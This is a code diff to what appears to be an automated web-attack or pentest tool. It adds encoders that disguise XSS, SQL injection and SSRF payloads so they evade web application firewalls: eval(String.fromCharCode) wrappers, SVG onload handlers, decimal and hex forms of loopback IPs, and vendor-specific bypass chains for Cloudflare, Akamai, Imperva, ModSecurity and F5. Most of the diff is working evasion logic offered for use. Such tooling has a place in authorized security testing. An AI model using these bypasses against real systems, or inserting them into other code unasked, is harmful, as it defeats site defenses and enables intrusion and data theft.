@@ -126,6 +126,92 @@ class Encoders:
         """MySQL backslash escaping bypass."""
         return payload.replace("'", "\\'").replace('"', '\\"')
 
+    @staticmethod
+    def js_string_fromcharcode(payload: str) -> str:
+        """Convert XSS payload to String.fromCharCode — evades regex-based WAFs."""
+        if "<script>" not in payload.lower() and "alert" not in payload.lower():
+            return payload
+        # Extract just the JS expression, wrap in fromCharCode
+        codes = ",".join(str(ord(c)) for c in payload)
+        return f"<img src=x onerror=eval(String.fromCharCode({codes}))>"
+
+    @staticmethod
+    def svg_event_handler(payload: str) -> str:
+        """Convert XSS to SVG-based event handler — bypasses <script> filters."""
+        if "<script>" not in payload.lower():
+            return payload
+        # Extract alert/JS code from script tags
+        inner = re.sub(r'</?script[^>]*>', '', payload, flags=re.IGNORECASE).strip()
+        return f'<svg onload="{inner}">'
+
+    @staticmethod
+    def js_template_literal(payload: str) -> str:
+        """Use JS template literals to bypass quote filters."""
+        if "alert" in payload:
+            return "<img src=x onerror=alert`1`>"
+        return payload
+
+    @staticmethod
+    def math_expression_sqli(payload: str) -> str:
+        """Replace 1=1 with mathematical expression for SQLi."""
+        return payload.replace("1=1", "1<2").replace("'1'='1'", "'a'<'b'")
+
+    @staticmethod
+    def json_content_type(payload: str) -> str:
+        """Hint to use JSON content-type — many WAFs only inspect form data."""
+        # This is a marker; actual content-type switching handled in exploit phase
+        return f"JSON_CT:{payload}"
+
+    @staticmethod
+    def multipart_boundary(payload: str) -> str:
+        """Hint to use multipart encoding — bypasses body inspection."""
+        return f"MULTIPART:{payload}"
+
+    @staticmethod
+    def header_injection(payload: str) -> str:
+        """Inject via X-Forwarded-For or other headers that bypass WAF."""
+        return f"HEADER_INJECT:{payload}"
+
+    @staticmethod
+    def line_break_split(payload: str) -> str:
+        """Split keywords across multiple lines — bypasses single-line regex."""
+        keywords = ["script", "alert", "onerror", "onload", "SELECT", "UNION"]
+        result = payload
+        for kw in keywords:
+            if kw.lower() in result.lower():
+                idx = result.lower().find(kw.lower())
+                mid = idx + len(kw) // 2
+                result = result[:mid] + "\n" + result[mid:]
+                break
+        return result
+
+    @staticmethod
+    def ip_decimal_bypass(payload: str) -> str:
+        """Convert SSRF IPs to decimal format — bypasses IP blocklists."""
+        # 127.0.0.1 → 2130706433
+        import re as _re
+        ip_match = _re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', payload)
+        if ip_match:
+            a, b, c, d = [int(x) for x in ip_match.groups()]
+            decimal_ip = (a << 24) + (b << 16) + (c << 8) + d
+            return _re.sub(r'\d+\.\d+\.\d+\.\d+', str(decimal_ip), payload, count=1)
+        return payload
+
+    @staticmethod
+    def ip_hex_bypass(payload: str) -> str:
+        """Convert SSRF IPs to hex format."""
+        import re as _re
+        ip_match = _re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', payload)
+        if ip_match:
+            hex_ip = ".".join(f"0x{int(x):02x}" for x in ip_match.groups())
+            return _re.sub(r'\d+\.\d+\.\d+\.\d+', hex_ip, payload, count=1)
+        return payload
+
+    @staticmethod
+    def protocol_relative_url(payload: str) -> str:
+        """Convert http:// to // — bypasses protocol-specific filters."""
+        return payload.replace("http://", "//").replace("https://", "//")
+
 
 class WAFModule:
     def __init__(self):
@@ -235,61 +321,94 @@ class WAFModule:
         return {"detected": False}
 
     async def adapt_payloads(self, payloads: list[dict], waf_info: dict) -> list[dict]:
-        """Adapt payloads to bypass detected WAF."""
+        """Adapt payloads to bypass detected WAF using vuln-type-specific strategies."""
         waf_name = waf_info.get("waf_name", "").lower()
         adapted = []
 
-        encoding_methods = [
+        # Base encoders (work for all vuln types)
+        base_encoders = [
             self.encoders.double_url_encode,
-            self.encoders.unicode_encode,
-            self.encoders.html_entities,
             self.encoders.case_swap,
-            self.encoders.null_byte_inject,
-            self.encoders.newline_inject,
             self.encoders.tab_inject,
-            self.encoders.overlong_utf8,
         ]
 
-        # Pick most effective encodings based on WAF type
+        # XSS-specific encoders
+        xss_encoders = [
+            self.encoders.html_entities,
+            self.encoders.js_string_fromcharcode,
+            self.encoders.svg_event_handler,
+            self.encoders.js_template_literal,
+            self.encoders.overlong_utf8,
+            self.encoders.unicode_encode,
+        ]
+
+        # SQLi-specific encoders
+        sqli_encoders = [
+            self.encoders.comment_injection_sql,
+            self.encoders.concat_bypass_sql,
+            self.encoders.math_expression_sqli,
+            self.encoders.null_byte_inject,
+            self.encoders.newline_inject,
+            self.encoders.backslash_escape,
+        ]
+
+        # SSRF-specific encoders
+        ssrf_encoders = [
+            self.encoders.ip_decimal_bypass,
+            self.encoders.ip_hex_bypass,
+            self.encoders.protocol_relative_url,
+            self.encoders.double_url_encode,
+        ]
+
+        # WAF-specific priority adjustments
         if "cloudflare" in waf_name:
-            encoding_methods = [
-                self.encoders.double_url_encode, self.encoders.unicode_encode,
-                self.encoders.case_swap, self.encoders.tab_inject,
-            ]
+            base_encoders = [self.encoders.double_url_encode, self.encoders.unicode_encode,
+                             self.encoders.case_swap, self.encoders.tab_inject]
         elif "akamai" in waf_name:
-            encoding_methods = [
-                self.encoders.null_byte_inject, self.encoders.double_url_encode,
-                self.encoders.newline_inject, self.encoders.overlong_utf8,
-            ]
+            base_encoders = [self.encoders.null_byte_inject, self.encoders.double_url_encode,
+                             self.encoders.newline_inject, self.encoders.overlong_utf8]
         elif "imperva" in waf_name or "incapsula" in waf_name:
-            encoding_methods = [
-                self.encoders.chunk_split, self.encoders.double_url_encode,
-                self.encoders.tab_inject, self.encoders.case_swap,
-            ]
+            base_encoders = [self.encoders.chunk_split, self.encoders.double_url_encode,
+                             self.encoders.tab_inject, self.encoders.case_swap]
         elif "modsecurity" in waf_name:
-            encoding_methods = [
-                self.encoders.overlong_utf8, self.encoders.null_byte_inject,
-                self.encoders.unicode_encode, self.encoders.newline_inject,
-            ]
+            base_encoders = [self.encoders.overlong_utf8, self.encoders.null_byte_inject,
+                             self.encoders.unicode_encode, self.encoders.newline_inject]
         elif "f5" in waf_name or "big-ip" in waf_name:
-            encoding_methods = [
-                self.encoders.double_url_encode, self.encoders.tab_inject,
-                self.encoders.case_swap, self.encoders.chunk_split,
-            ]
-        else:
-            encoding_methods = encoding_methods[:4]
+            base_encoders = [self.encoders.double_url_encode, self.encoders.tab_inject,
+                             self.encoders.case_swap, self.encoders.chunk_split]
 
         for payload_data in payloads:
-            original = payload_data["payload"]
+            original = payload_data.get("payload", "")
+            if not original:
+                continue
+            vtype = payload_data.get("vuln_type", "").lower()
 
             # Keep original
             adapted.append(payload_data)
 
+            # Select encoders based on vuln type
+            if vtype in ("xss", "xss_reflected", "xss_stored", "xss_dom"):
+                encoders = base_encoders + xss_encoders
+            elif vtype in ("sqli", "sqli_blind", "nosql_injection"):
+                encoders = base_encoders + sqli_encoders
+            elif vtype in ("ssrf",):
+                encoders = ssrf_encoders + base_encoders
+            elif vtype in ("ssti", "cmd_injection"):
+                encoders = base_encoders + [
+                    self.encoders.null_byte_inject,
+                    self.encoders.newline_inject,
+                    self.encoders.unicode_encode,
+                ]
+            else:
+                encoders = base_encoders
+
             # Generate encoded variants
-            for encoder in encoding_methods:
+            seen = {original}
+            for encoder in encoders:
                 try:
                     encoded = encoder(original)
-                    if encoded != original:
+                    if encoded and encoded not in seen:
+                        seen.add(encoded)
                         new_payload = payload_data.copy()
                         new_payload["payload"] = encoded
                         new_payload["encoding"] = encoder.__name__
@@ -297,30 +416,6 @@ class WAFModule:
                         adapted.append(new_payload)
                 except Exception:
                     continue
-
-            # SQL-specific bypass for SQL injection payloads
-            if payload_data.get("vuln_type") in ("sqli", "sqli_blind"):
-                try:
-                    commented = self.encoders.comment_injection_sql(original)
-                    new_payload = payload_data.copy()
-                    new_payload["payload"] = commented
-                    new_payload["encoding"] = "comment_injection"
-                    new_payload["waf_bypass"] = True
-                    adapted.append(new_payload)
-                except Exception:
-                    pass
-
-                # Hex-encoded keyword bypass
-                try:
-                    hex_bypass = self.encoders.concat_bypass_sql(original)
-                    if hex_bypass != original:
-                        new_payload = payload_data.copy()
-                        new_payload["payload"] = hex_bypass
-                        new_payload["encoding"] = "hex_keyword_bypass"
-                        new_payload["waf_bypass"] = True
-                        adapted.append(new_payload)
-                except Exception:
-                    pass
 
             # HTTP Parameter Pollution: split payload across duplicate params
             if payload_data.get("params"):
